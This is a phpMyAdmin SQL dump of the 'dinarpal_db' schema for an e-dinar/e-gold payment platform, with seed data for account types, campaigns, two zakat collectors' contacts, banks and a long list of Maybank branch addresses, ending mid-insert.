-- phpMyAdmin SQL Dump
-- version 4.0.10.15
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Apr 29, 2016 at 11:37 PM
-- Server version: 5.1.73
-- PHP Version: 5.3.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `dinarpal_db`
--

-- --------------------------------------------------------

--
-- Table structure for table `account_type`
--

CREATE TABLE IF NOT EXISTS `account_type` (
  `at_id` int(11) NOT NULL AUTO_INCREMENT,
  `at_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`at_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `account_type`
--

INSERT INTO `account_type` (`at_id`, `at_desc`) VALUES
(1, 'E-Dinar'),
(2, 'E-Gold Reserved'),
(3, 'E-Dirham'),
(4, 'E-Silver Reserved'),
(5, 'E-Point');

-- --------------------------------------------------------

--
-- Table structure for table `advertising_campaign`
--

CREATE TABLE IF NOT EXISTS `advertising_campaign` (
  `adc_id` int(11) NOT NULL AUTO_INCREMENT,
  `adc_desc` varchar(200) NOT NULL,
  `adc_rate` varchar(200) NOT NULL,
  `adc_status` int(11) NOT NULL DEFAULT '1',
  `adc_type` varchar(20) NOT NULL,
  PRIMARY KEY (`adc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `advertising_campaign`
--

INSERT INTO `advertising_campaign` (`adc_id`, `adc_desc`, `adc_rate`, `adc_status`, `adc_type`) VALUES
(1, 'Discount', '10', 1, 'DYNAMIC'),
(2, 'Cash Rebate', '10', 1, 'STATIC'),
(3, 'Group-On', '100', 1, 'STATIC'),
(4, 'Bai Al-Wafa', '100', 1, 'STATIC'),
(5, 'No Campaign', '5', 1, 'DYNAMIC');

-- --------------------------------------------------------

--
-- Table structure for table `amanah_deal`
--

CREATE TABLE IF NOT EXISTS `amanah_deal` (
  `ad_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id_from` int(11) NOT NULL,
  `me_id_to` int(11) NOT NULL,
  `ad_amount` varchar(200) DEFAULT '0',
  `at_id` int(11) NOT NULL,
  `ft_id` int(11) NOT NULL,
  `ad_notes` varchar(500) DEFAULT NULL,
  `ad_datetime` datetime NOT NULL,
  `ts_id` int(11) NOT NULL,
  PRIMARY KEY (`ad_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `amil`
--

CREATE TABLE IF NOT EXISTS `amil` (
  `am_id` int(11) NOT NULL AUTO_INCREMENT,
  `am_image` varchar(500) DEFAULT NULL,
  `am_name` varchar(200) NOT NULL,
  `am_phone` varchar(200) DEFAULT NULL,
  `am_email` varchar(200) DEFAULT NULL,
  `am_address` varchar(500) DEFAULT NULL,
  `am_whatsapp` varchar(200) DEFAULT NULL,
  `am_status` int(11) DEFAULT '1',
  PRIMARY KEY (`am_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `amil`
--

INSERT INTO `amil` (`am_id`, `am_image`, `am_name`, `am_phone`, `am_email`, `am_address`, `am_whatsapp`, `am_status`) VALUES
(1, 'default-img.jpg', 'Ustaz Nizam Rashid', '019-9737579', 'kizaru@dinarpal.com', '2016-03-18', '019-9737579', 1),
(2, 'default-img.jpg', 'Ustazah Amira Nadirah', '019-3355979', 'kenshin@dinarpal.com', '2016-03-18', '019-3355979', 1);

-- --------------------------------------------------------

--
-- Table structure for table `amil_certificate`
--

CREATE TABLE IF NOT EXISTS `amil_certificate` (
  `ac_id` int(11) NOT NULL AUTO_INCREMENT,
  `ac_link` varchar(2000) DEFAULT NULL,
  `ac_size` varchar(200) DEFAULT NULL,
  `am_id` int(11) NOT NULL,
  PRIMARY KEY (`ac_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `amil_status`
--

CREATE TABLE IF NOT EXISTS `amil_status` (
  `as_id` int(11) NOT NULL AUTO_INCREMENT,
  `as_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`as_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `amil_status`
--

INSERT INTO `amil_status` (`as_id`, `as_desc`) VALUES
(1, 'Available'),
(2, 'Not Available');

-- --------------------------------------------------------

--
-- Table structure for table `banks`
--

CREATE TABLE IF NOT EXISTS `banks` (
  `ba_id` int(11) NOT NULL AUTO_INCREMENT,
  `ba_name` varchar(200) DEFAULT NULL,
  `ba_addinfo` varchar(500) DEFAULT NULL,
  `ba_status` int(11) DEFAULT '1',
  PRIMARY KEY (`ba_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=13 ;

--
-- Dumping data for table `banks`
--

INSERT INTO `banks` (`ba_id`, `ba_name`, `ba_addinfo`, `ba_status`) VALUES
(10, 'Maybank Sdn Bhd', NULL, 1),
(11, 'CIMB Bank bhd', NULL, NULL),
(12, 'Public Bank Berhad', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `banks_branch_info`
--

CREATE TABLE IF NOT EXISTS `banks_branch_info` (
  `bbi_id` int(11) NOT NULL AUTO_INCREMENT,
  `ba_id` int(11) NOT NULL,
  `co_id` int(11) NOT NULL,
  `bbi_address` varchar(500) DEFAULT NULL,
  `bbi_city` varchar(200) DEFAULT NULL,
  `bbi_zipcode` varchar(200) DEFAULT NULL,
  `bbi_state` varchar(200) DEFAULT NULL,
  `bbi_phone` varchar(200) DEFAULT NULL,
  `bbi_digitrouting` varchar(200) DEFAULT NULL,
  `bbi_swiftcode` varchar(200) DEFAULT NULL,
  `bbi_addinfo` varchar(500) DEFAULT NULL,
  `bbi_status` int(11) DEFAULT '1',
  PRIMARY KEY (`bbi_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=889 ;

--
-- Dumping data for table `banks_branch_info`
--

INSERT INTO `banks_branch_info` (`bbi_id`, `ba_id`, `co_id`, `bbi_address`, `bbi_city`, `bbi_zipcode`, `bbi_state`, `bbi_phone`, `bbi_digitrouting`, `bbi_swiftcode`, `bbi_addinfo`, `bbi_status`) VALUES
(1, 10, 3, 'maybank sdn bhd, bandar mitc, 75450, ayer keroh, melaka.', 'ayer keroh', '75450', 'melaka', '0199993323', '123123123123', 'asdasdwasd', NULL, NULL),
(6, 10, 3, 'Lots 103 & 104, Jalan Hulu Besar Pasar, ', 'Kelantan ', '16200', 'Kelantan ', '+609-725 7480', NULL, NULL, NULL, NULL),
(7, 10, 3, 'G-Floor, UMNO Building, ', ' Tanah Merah, ', '17500', 'Kelantan', '+609-955 6190', NULL, NULL, NULL, NULL),
(8, 10, 3, 'Lot P.T. 192, Pusat Perkedaian Baru, ', ' Rantau Panjang, ', '17200', 'Kelantan', '+609-795 0373', NULL, NULL, NULL, NULL),
(9, 10, 3, 'Lots 1526-9, Jalan Tengku Zainal Abidin, ', 'Kuala Krai, ', '18000 ', 'Kelantan', '+609-966 7946', NULL, NULL, NULL, NULL),
(10, 10, 3, '5493D & E, Jalan Sultan Yahya Petra, ', 'Kota Bharu, ', '15200 ', 'Kelantan', '+609-748 5740', NULL, NULL, NULL, NULL),
(11, 10, 3, '3880-E, Jalan Mahmood, ', ' Kota Bharu, ', '15200', 'Kelantan ', '+609-741 8181', NULL, NULL, NULL, NULL),
(12, 10, 3, 'Lot 342, Jalan Sultan Yahya Petra, ', ' Kota Bharu,', '15200', ' Kelantan', '+609-741 9561', NULL, NULL, NULL, NULL),
(13, 10, 3, '45, Jalan Besar, ', 'Gua Musang, ', '18300 ', 'Kelantan', '+609-912 4200', NULL, NULL, NULL, NULL),
(14, 10, 3, 'Lot 238, Jalan Pasar,', 'Bachok, ', ' 16300 ', 'Kelantan', '+609-778 0832', NULL, NULL, NULL, NULL),
(15, 10, 3, '6 - 7, Jalan Bandar, ', 'Triang, ', '28300 ', 'Pahang', '+609-255 1846', NULL, NULL, NULL, NULL),
(16, 10, 3, 'A-73, Jalan Ahmad Shah, ', 'Temerloh, ', '28000 ', 'Pahang ', '+609-296 1797', NULL, NULL, NULL, NULL),
(17, 10, 3, '69 - 70, Persiaran Camellia 4, Cameron Highlands, ', 'Tanah Rata, ', '39000 ', 'Pahang', '+605-491 1616', NULL, NULL, NULL, NULL),
(18, 10, 3, 'Lot 15610 - 15611, Jalan Lipis, ', 'Raub, ', '27600 ', 'Pahang', '+609-355 4657', NULL, NULL, NULL, NULL),
(19, 10, 3, 'No 96, Jalan Sultan Abdullah,', 'Pekan,', ' 26600 ', ' Pahang', '+609-422 8903', NULL, NULL, NULL, NULL),
(20, 10, 3, 'MM55-59, Jalan Persiaran Dara, Medan Mewah, ', 'Muadzam Shah, ', '26700 ', 'Pahang', '+609-452 2091', NULL, NULL, NULL, NULL),
(21, 10, 3, '1, Jalan Haji Kassim, ', 'Mentakab, ', '28409', 'Pahang', '+609-277 1151', NULL, NULL, NULL, NULL),
(22, 10, 3, 'No. A21 & A23, Lorong Pandan Permai 2/2, Pandan Permai, Jalan Gambang, ', 'Kuantan, ', '25150 ', 'Pahang', '+609-539 6815', NULL, NULL, NULL, NULL),
(23, 10, 3, 'UMNO Building, 1, Jalan Hj Abdul Aziz,', ' Kuantan,', ' 25000', ' Pahang', '+609-512 1180', NULL, NULL, NULL, NULL),
(24, 10, 3, 'UMNO Building, 1, Jalan Hj Abdul Aziz, ', 'Kuantan, ', '25000 ', 'Pahang', '+609-512 1172', NULL, NULL, NULL, NULL),
(25, 10, 3, '21 & 22, Jalan Utama, Bandar Baru Rompin, ', 'Kuala Rompin, ', '26800 ', 'Pahang', '+609-414 0015', NULL, NULL, NULL, NULL),
(26, 10, 3, '92A & 92B, Jalan Besar,', ' Kuala Lipis, ', ' 27200', 'Pahang', '+609-312 1600', NULL, NULL, NULL, NULL),
(27, 10, 3, '647, Kampung Baru Karak,', 'Karak,', ' 28600 ', ' Pahang', '+609-231 1235', NULL, NULL, NULL, NULL),
(28, 10, 3, 'No. 2 & 3, Lorong Alamanda 1, Taman Alamanda, ', 'Jerantut, ', '27000 ', 'Pahang', '+609-260 1822', NULL, NULL, NULL, NULL),
(29, 10, 3, 'A 6628, A 6630 & A 6632, Jalan Beserah,', 'Kuantan, ', ' 25250 ', 'Pahang', '+609-560 1161', NULL, NULL, NULL, NULL),
(30, 10, 3, '61 - 65, Jalan Tun Ismail, ', 'Kuantan, ', '25000 ', 'Pahang', '+609-517 9673', NULL, NULL, NULL, NULL),
(31, 10, 3, 'Genting Hotel Building, Pejabat Pos Genting Highlands, Genting Highlands, Selangor-Pahang Border, ', 'Genting Highlands, ', '69000 ', 'Pahang', '+603-6101 2433', NULL, NULL, NULL, NULL),
(32, 10, 3, 'Ground Floor, Shopping Arcade,', 'Bukit Fraser, ', ' 49000 ', 'Pahang', '+609-362 2251', NULL, NULL, NULL, NULL),
(33, 10, 3, '117-8, Jalan Loke Yew, ', 'Bentong, ', '28700 ', 'Pahang', '+609-222 5533', NULL, NULL, NULL, NULL),
(34, 10, 3, '6 & 7, Nadi Kota,', 'Bandar Jengka,', ' 26400 ', ' Pahang', '+609-466 1469', NULL, NULL, NULL, NULL),
(35, 10, 3, 'Medan Mahkota, Jalan Ah Cheng, ', 'Telok Intan, ', '36000 ', 'Perak', '+605-625 1127', NULL, NULL, NULL, NULL),
(36, 10, 3, 'Jalan Besar, ', ' Tapah,', '35000', ' Perak ', '+605-403 4100', NULL, NULL, NULL, NULL),
(37, 10, 3, 'Jalan Chong Ah Peng, ', ' Tanjung Malim, ', '35900', 'Perak ', '+605-459 6328', NULL, NULL, NULL, NULL),
(38, 10, 3, '234-237, Jalan Chung Thye Phin, ', 'Taiping, ', '34000 ', 'Perak', '+605-805 3388', NULL, NULL, NULL, NULL),
(39, 10, 3, '188, Jalan Besar, ', 'Sungai Siput (U), ', '31100 ', 'Perak', '+605-597 2854', NULL, NULL, NULL, NULL),
(40, 10, 3, '18, Jalan Besar, ', 'Pulau Pangkor,', '32300 ', ' Perak', '+605-685 1493', NULL, NULL, NULL, NULL),
(41, 10, 3, '19A, Jalan Iskandar, ', 'Pengkalan Hulu, ', '33100 ', 'Perak', '+604-477 8389', NULL, NULL, NULL, NULL),
(42, 10, 3, ' No. 21-23, Jln Damai, Tmn Damai, Bdr Baru Parit Buntar, ', 'Parit Buntar, ', '34200 ', 'Perak', '+605-716 7740', NULL, NULL, NULL, NULL),
(43, 10, 3, '5, Ground & 1st Floor, Persiaran PM 2/2, Pusat Bandar Sri Manjung, Seksyen 2,', 'Sri Manjung, ', ' 32040 ', 'Perak', '+605-688 6510', NULL, NULL, NULL, NULL),
(44, 10, 3, '624 - 6, Jalan Ahmad Boestaman, ', 'Slim River, ', '35800 ', 'Perak', '+605-452 0884', NULL, NULL, NULL, NULL),
(45, 10, 3, '82A, Jalan Besar, Kampong Koh, ', 'Sitiawan,', '32000 ', ' Perak', '+605-691 2108', NULL, NULL, NULL, NULL),
(46, 10, 3, 'Jalan Besar, ', 'Selama, ', '34100 ', 'Perak', '+605-839 4212', NULL, NULL, NULL, NULL),
(47, 10, 3, 'Lots 2725-6, Jalan Besar,', ' Pantai Remis, ', ' 34900', 'Perak', '+605-677 1466', NULL, NULL, NULL, NULL),
(48, 10, 3, '26A, Jalan Besar,', 'Malim Nawar,', ' 31700 ', ' Perak', '+605-477 4580', NULL, NULL, NULL, NULL),
(49, 10, 3, '10, Jalan Sultan Idris Shah, ', ' Lumut, ', '32200', 'Perak', '+605-683 5731', NULL, NULL, NULL, NULL),
(50, 10, 3, 'Main Road, ', 'Lenggong, ', '33400 ', 'Perak', '+605-767 7419', NULL, NULL, NULL, NULL),
(51, 10, 3, '20, Jalan Silang, ', 'Langkap, ', '36700 ', 'Perak', '+605-659 6301', NULL, NULL, NULL, NULL),
(52, 10, 3, '68 - 70, Jalan Raja Bendahara, Fasa II Bandar Baru, ', 'Kuala Kangsar, ', '33000 ', 'Perak', '+605-776 1649', NULL, NULL, NULL, NULL),
(53, 10, 3, '1-3, Jln Medan Saujana, Taman Medan Saujana, ', 'Kamunting, ', '34600 ', 'Perak', '+605-806 9887', NULL, NULL, NULL, NULL),
(54, 10, 3, '154 - 156, Jalan Gopeng, ', 'Kampar,', '31900 ', ' Perak', '+605-466 5188', NULL, NULL, NULL, NULL),
(55, 10, 3, '277 - 281, Jalan Silibin, ', ' Ipoh, ', '30100', 'Perak', '+605-526 4699', NULL, NULL, NULL, NULL),
(56, 10, 3, 'Jalan Tranchell, ', 'Ipoh, ', '31450 ', 'Perak', '+605-281 1421', NULL, NULL, NULL, NULL),
(57, 10, 3, '211-1, 213 & 213-1, Jalan Pasir Putih, ', 'Ipoh, ', '31650 ', 'Perak', '+605-241 8018', NULL, NULL, NULL, NULL),
(58, 10, 3, 'No. 129 & 131, Jalan Pengkalan Barat, Taman Shatin Barat, ', ' Ipoh, ', '31650', 'Perak', '+605-323 4969', NULL, NULL, NULL, NULL),
(59, 10, 3, 'No 2, 4 & 6, Persiaran Greentown 1, Pusat Perdagangan Greentown, ', 'Ipoh, ', '30450 ', 'Perak', '+605-255 3410', NULL, NULL, NULL, NULL),
(60, 10, 3, 'No 2, Persiaran SCI 2/1, Sunway City Ipoh, ', ' Ipoh, ', '31150', 'Perak', '+605-549 9170', NULL, NULL, NULL, NULL),
(61, 10, 3, '194-206, Ground Floor, Jalan Sultan Idris, ', 'Ipoh,', '30000 ', ' Perak', '+605-241 3726', NULL, NULL, NULL, NULL),
(62, 10, 3, 'Bangunan Mayban Trust, 28, Jalan Tun Sambanthan, ', 'Ipoh, ', '30000 ', 'Perak', '+605-241 2131', 'MBBEMYKLIPH', NULL, NULL, NULL),
(63, 10, 3, '112, Jalan Canning Estate, Ipoh Garden, ', ' Ipoh, ', '31400', 'Perak ', '+605-547 4561', NULL, NULL, NULL, NULL),
(64, 10, 3, 'No 1-1B, Jalan Wira Jaya, Taman Ipoh Jaya Timur 1, ', 'Ipoh, ', '31350 ', 'Perak', '+605-312 9129', NULL, NULL, NULL, NULL),
(65, 10, 3, '239 - 241, Jalan Bercham, Bercham, ', 'Ipoh, ', '31400 ', 'Perak', '+605-545 4188', NULL, NULL, NULL, NULL),
(66, 10, 3, '1-AZ, Lorong 1, Taman Wawasan, Simpang Empat,', 'Hutan Melintang, ', ' 36400 ', 'Perak', '+605-642 1125', NULL, NULL, NULL, NULL),
(67, 10, 3, 'Ground Floor, UMNO Building, Jalan Sultan Iskandar, ', 'Grik, ', '33300 ', 'Perak', '+605-791 3588', NULL, NULL, NULL, NULL),
(68, 10, 3, 'No. 16 & 18, Laluan Klebang Restu 2, Medan Klebang Restu, ', 'Chemor, ', '31200 ', 'Perak', '+605-291 9133', NULL, NULL, NULL, NULL),
(69, 10, 3, '16 - 17, Jalan Persatuan, ', 'Bidor, ', '35500 ', 'Perak', '+605-434 2500', NULL, NULL, NULL, NULL),
(70, 10, 3, 'Lot 1 & 2, Jalan Pejabat Pos, ', 'Batu Gajah, ', '31000 ', 'Perak', '+605-366 1445', NULL, NULL, NULL, NULL),
(71, 10, 3, '100, Jalan Besar,', ' Bagan Serai,', ' 34300', ' Perak', '+605-721 1262', NULL, NULL, NULL, NULL),
(72, 10, 3, ' Lot 1371-2, Jalan Pekan, ', 'Padang Besar, ', '02100 ', 'Perlis', '+604-949 0420', NULL, NULL, NULL, NULL),
(73, 10, 3, 'Lot 24-5, Jalan Besar, Pekan Kuala Perlis, ', 'Kuala Perlis, ', '02000 ', 'Perlis', '+604-985 4016', NULL, NULL, NULL, NULL),
(74, 10, 3, 'Upper Ground Floor, Menara KWSP, Jalan Bukit Lagi, ', ' Kangar, ', '01000', 'Perlis', '+604-976 4846', NULL, NULL, NULL, NULL),
(75, 10, 3, '58-60, Jalan Besar, ', 'Bahau, ', '72100 ', 'Negeri Sembilan', '+606-454 1137', NULL, NULL, NULL, NULL),
(76, 10, 3, '4 & 5, Jalan Tampin, ', 'Gemas, ', '73400 ', 'Negeri Sembilan', '+607-948 1278', NULL, NULL, NULL, NULL),
(77, 10, 3, 'Lots 3235-7, Gemencheh Baru, ', 'Gemencheh, ', '73200 ', 'Negeri Sembilan', '+606-431 6279', NULL, NULL, NULL, NULL),
(78, 10, 3, '121, Jalan Keyser, Wisma UMNO, Jalan Dato'' Moyang Salleh, ', 'Kuala Klawang, ', '71600 ', 'Negeri Sembilan', '+606-613 6344', NULL, NULL, NULL, NULL),
(79, 10, 3, '95 - 96, Jalan Dato'' Undang Johol, ', 'Kuala Pilah, ', '72000 ', 'Negeri Sembilan', '+606-481 1695', NULL, NULL, NULL, NULL),
(80, 10, 3, '1, Jalan Besar, Kawasan Hijau, ', 'Mantin, ', '71700 ', 'Negeri Sembilan', '+606-758 1266', NULL, NULL, NULL, NULL),
(81, 10, 3, 'PT 7443, Jalan BBN 1/2F, Bandar Baru Nilai, ', 'Nilai, ', '71800 ', 'Negeri Sembilan', '+606-799 3316', NULL, NULL, NULL, NULL),
(82, 10, 3, '409, Jalan Baru, ', ' Port Dickson, ', '71000', 'Negeri Sembilan', '+606-647 1263', NULL, NULL, NULL, NULL),
(83, 10, 3, '56 & 57, Jalan Tuanku Antah, ', ' Seremban, ', '70000', 'Negeri Sembilan', '+606-761 1500', NULL, NULL, NULL, NULL),
(84, 10, 3, '73 & 74, Jalan Taman Komersil Senawang 4, Taman Komersil Senawang, ', 'Seremban, ', '70450 ', 'Negeri Sembilan', '+606-679 4330', NULL, NULL, NULL, NULL),
(85, 10, 3, '166 - 169, Jalan Dato'' Bandar Tunggal, ', 'Seremban, ', '70000 ', 'Negeri Sembilan', '+606-762 5242', NULL, 'MBBEMYKLSBN', NULL, NULL),
(86, 10, 3, 'No 36 & 37, Jalan S2 B18, Biz Avenue, Seremban 2, ', 'Seremban, ', '70300 ', 'Negeri Sembilan', '+606-601 2166', NULL, NULL, NULL, NULL),
(87, 10, 3, '4772-AG, Jalan Simpang Empat, ', 'Alor Gajah, ', '78000 ', 'Melaka', '+606-556 1970', NULL, NULL, NULL, NULL),
(88, 10, 3, 'No. G4 & G6, Lebuh Ayer Keroh, ', 'Ayer Keroh,', '75450 ', ' Melaka', '+606-232 7830', NULL, NULL, NULL, NULL),
(89, 10, 3, 'Ground Floor & M. Floor, Bangunan UMNO, Lot 20, Jalan Kesang,', 'Jasin,', ' 77000 ', ' Melaka', '+606-529 2072', NULL, NULL, NULL, NULL),
(90, 10, 3, 'SU 942, 943 & 944, Jalan Bandar Baru 6, Taman Bandar Baru Masjid Tanah, ', 'Masjid Tanah, ', '78300 ', 'Melaka', '+606-384 2323', NULL, NULL, NULL, NULL),
(91, 10, 3, '171-175, Jalan Munshi Abdullah, ', 'Melaka', '75000 ', 'Melaka', '+606-284 0312', NULL, NULL, NULL, NULL),
(92, 10, 3, '114 & 114A, Graha Peladang, Jalan Hang Tuah,', ' Melaka', ' 75300', ' Melaka', '+606-282 2214', NULL, 'MBBEMYKLMAL', NULL, NULL),
(93, 10, 3, '138 - 142, Jalan Suria 2, Taman Malim Jaya, ', 'Melaka', '75250 ', 'Melaka', '+606-334 1559', NULL, NULL, NULL, NULL),
(94, 10, 3, 'No 225, 226 & 227, Taman Melaka Jaya, Jalan Bandar Hilir, ', 'Melaka', '75000 ', 'Melaka', '+606-281 0713', NULL, NULL, NULL, NULL),
(95, 10, 3, 'No. 102-106, Jalan Cheng Baru 1, Taman Cheng Baru, ', 'Melaka', '75250 ', 'Melaka', '+606-337 1215', NULL, NULL, NULL, NULL),
(96, 10, 3, 'JB1, Jalan Debunga 1, Taman Debunga, ', 'Merlimau, ', '77300 ', 'Melaka', '+606-263 1008', NULL, NULL, NULL, NULL),
(97, 10, 3, 'AG-6344, Jalan Besar, Pulau Sebang, ', 'Tampin, ', '73000 ', 'Melaka', '+606-441 7443', NULL, NULL, NULL, NULL),
(98, 10, 3, 'Lot 238, Jalan Pasar, ', ' Bachok, ', '16300', 'Kelantan', '+609-778 0832', NULL, NULL, NULL, NULL),
(99, 10, 3, 'Lot P.T. 192, Pusat Perkedaian Baru, ', 'Rantau Panjang, ', '17200 ', 'Kelantan', '+609-795 0373', NULL, NULL, NULL, NULL),
(100, 10, 3, 'G-Floor, UMNO Building, ', 'Tanah Merah, ', '17500 ', 'Kelantan', '+609-955 6190', NULL, NULL, NULL, NULL),
(101, 10, 3, 'Lots 103 & 104, Jalan Hulu Besar Pasar, ', 'Tumpat, ', '16200 ', 'Kelantan', '+609-725 7480', NULL, NULL, NULL, NULL),
(102, 10, 3, '45, Jalan Besar, ', ' Gua Musang,', '18300', ' Kelantan', '+609-912 4200', NULL, NULL, NULL, NULL),
(103, 10, 3, 'Lot 342, Jalan Sultan Yahya Petra, ', 'Kota Bharu, ', '15200 ', 'Kelantan', '+609-741 9561', NULL, NULL, NULL, NULL),
(104, 10, 3, '3880-E, Jalan Mahmood, ', 'Kota Bharu, ', '15200 ', 'Kelantan', '+609-741 8181', NULL, NULL, NULL, NULL),
(105, 10, 3, '5493D & E, Jalan Sultan Yahya Petra, ', 'Kota Bharu,', '15200 ', ' Kelantan', '+609-748 5740', NULL, NULL, NULL, NULL),
(106, 10, 3, 'Lots 1526-9, Jalan Tengku Zainal Abidin, ', ' Kuala Krai, ', '18000', 'Kelantan', '+609-966 7946', NULL, NULL, NULL, NULL),
(107, 10, 3, 'No 15, Jalan DP5/1B, Bandar Damai Perdana, ', 'Kuala Lumpur ', '56000 ', 'Kuala Lumpur', '+603-9100 1802 / 03-9100 1861', NULL, NULL, NULL, NULL),
(108, 10, 3, 'Lot 1.01, Ampang Park Shopping, Jalan Ampang,', 'Kuala Lumpur ', ' 50450 ', 'Kuala Lumpur ', '+603-2164 6308', NULL, NULL, NULL, NULL),
(109, 10, 3, '7 & 9, Jalan 3/76D, Desa Pandan, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur ', '+603-9281 3598', NULL, NULL, NULL, NULL),
(110, 10, 3, 'Lot GF-32, Ground Floor, The Waterfront @ Parkcity KL, 5, Persiaran Residen, Desa Parkcity, ', ' Kuala Lumpur ', '52100', ' Kuala Lumpur ', '+603-6280 7601', NULL, NULL, NULL, NULL),
(111, 10, 3, '21 & 23, Jalan 23/70A, Desa Sri Hartamas, ', 'Kuala Lumpur ', '50680 ', 'Kuala Lumpur ', '+603-6203 5600', NULL, NULL, NULL, NULL),
(112, 10, 3, 'Wisma K.S, No. 5, Jalan Meranti, Taman Setapak,', 'Kuala Lumpur ', ' 53000 ', 'Kuala Lumpur ', '+603-4022 2130 / 03-4022 2432', NULL, NULL, NULL, NULL),
(113, 10, 3, 'AG 1, 2, 9 & 10, Ground Floor, Plaza Pekeliling, 2, Jalan Tun Razak, ', 'Kuala Lumpur', '50500 ', 'Kuala Lumpur', '+603-4041 6049', NULL, NULL, NULL, NULL),
(114, 10, 3, '42-44, Jalan Merlimau, Off Jalan Kenanga,', 'Kuala Lumpur ', ' 55200 ', 'Kuala Lumpur ', '+603-9222 6431', NULL, NULL, NULL, NULL),
(115, 10, 3, 'No. 1 & 3, Jalan Desa, Taman Desa, ', ' Kuala Lumpur ', '58100', ' Kuala Lumpur ', '+603-7983 1020', NULL, NULL, NULL, NULL),
(116, 10, 3, 'No. 1 & 3, Jalan Kuchai Maju 1, off Jalan Kuchai Lama,', 'Kuala Lumpur', ' 58200 ', 'Kuala Lumpur ', '+603-7987 6451', NULL, NULL, NULL, NULL),
(117, 10, 3, '66, 68 & 70, Jalan Maarof, Bangsar Baru, ', 'Kuala Lumpur ', '59100 ', 'Kuala Lumpur ', '+603-2284 6379', NULL, 'MBBEMYKLBAN', NULL, NULL),
(118, 10, 3, '105, Jalan Bunus, Off Jalan Masjid India, ', 'Kuala Lumpur ', '50100 ', 'Kuala Lumpur', '+603-2691 1568', NULL, NULL, NULL, NULL),
(119, 10, 3, 'Ground Floor, Wisma FELDA, Jalan Perumahan Gurney, ', 'Kuala Lumpur', '54000 ', 'Kuala Lumpur ', '+603-2698 0357', NULL, NULL, NULL, NULL),
(120, 10, 3, 'Ground Floor, MUI Plaza, Jalan P. Ramlee, ', 'Kuala Lumpur ', '50250 ', 'Kuala Lumpur', '+603-2143 0325', NULL, NULL, NULL, NULL),
(121, 10, 3, '418-24, Jalan Pudu,', 'Kuala Lumpur', ' 55100 ', 'Kuala Lumpur ', '+603-2142 3555', NULL, 'MBBEMYKLPUD', NULL, NULL),
(122, 10, 3, 'Ground Floor (Utara), Menara DBKL 2, Jalan Raja Laut, ', 'Kuala Lumpur', '50350 ', 'Kuala Lumpur ', '+603-2698 8731', NULL, NULL, NULL, NULL),
(123, 10, 3, 'Grd-Floor, Wisma Awal, 171, Jalan Raja Muda, ', 'Kuala Lumpur', '50300 ', 'Kuala Lumpur', '+603-2691 7409', NULL, NULL, NULL, NULL),
(124, 10, 3, 'Level 1 & 2, Menara IMC, 8, Jalan Sultan Ismail, ', 'Kuala Lumpur ', '50250 ', 'Kuala Lumpur ', '+603-2032 3366', NULL, NULL, NULL, NULL),
(125, 10, 3, '404-10, Jalan Tuanku Abdul Rahman,', 'Kuala Lumpur Tel: ', ' 55100 ', 'Kuala Lumpur Tel: ', '+603-2691 9413', NULL, NULL, NULL, NULL),
(126, 10, 3, '92, Jalan Tun H.S. Lee, ', 'Kuala Lumpur', '50000 ', 'Kuala Lumpur', '+603-2078 9109', NULL, NULL, NULL, NULL),
(127, 10, 3, '21, 23, 25 & 27, Jalan 2/32, Off 6 1/2 Mile, Jalan Kepong, ', 'Kuala Lumpur', '52000 ', 'Kuala Lumpur', '+603-6257 1188', NULL, NULL, NULL, NULL),
(128, 10, 3, 'No. 10 & 12, Pusat Niaga Metro Prima, Jalan Prima 5, Metro Prima, Kepong, ', 'Kuala Lumpur ', '52100 ', 'Kuala Lumpur ', '+603-6258 7100', NULL, NULL, NULL, NULL),
(129, 10, 3, 'No 59 Grd, 1st and 2nd Floor Jalan Sri Permaisuri 8 Bandar Sri Permaisuri, ', ' Kuala Lumpur', '56000', ' Kuala Lumpur', '+603-9172 7612', NULL, NULL, NULL, NULL),
(130, 10, 3, '1st Floor, Menara Maybank, 100, Jalan Tun Perak, ', 'Kuala Lumpur ', '50050 ', 'Kuala Lumpur ', '+603-2074 7028', NULL, 'MBBEMYKLCSD', NULL, NULL),
(131, 10, 3, 'Level 2 Unit 49, Kompleks Pernas - SOGO, 190, Jalan Tuanku Abdul Rahman, ', 'Kuala Lumpur ', '50100 ', 'Kuala Lumpur ', '+603-2694 1300', NULL, NULL, NULL, NULL),
(132, 10, 3, 'Lot C-21-C, Concourse Ext, Suria KLCC, KL City Centre, ', 'Kuala Lumpur ', '50088 ', 'Kuala Lumpur ', '+603-2026 0239', NULL, NULL, NULL, NULL),
(133, 10, 3, '8-10, Jalan 53, Desa Jaya, Kepong, ', 'Kuala Lumpur ', '52100 ', 'Kuala Lumpur', '+603-6276 0001', NULL, 'MBBEMYKLKEP', NULL, NULL),
(134, 10, 3, '103-107, Jalan Mega Mendong, Bandar Park, Jalan Kelang Lama, ', 'Kuala Lumpur ', '58000 ', 'Kuala Lumpur ', '+603-7982 3211', NULL, NULL, NULL, NULL),
